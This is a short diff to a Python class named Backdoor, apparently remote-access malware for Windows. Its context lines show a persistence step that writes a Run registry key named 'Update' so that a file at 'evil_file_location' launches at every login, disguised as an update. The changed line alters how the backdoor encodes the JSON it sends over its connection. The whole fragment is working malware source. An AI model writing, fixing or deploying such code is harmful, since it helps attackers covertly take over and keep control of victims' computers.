@@ -16,7 +16,7 @@ class Backdoor:
 			subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
 	def reliable_send(self, data):
-		json_data = json.dumps(data)
+		json_data = json.dumps(data, encoding='latin1')
 		self.connection.send(json_data)
 
 	def reliable_receive(self):
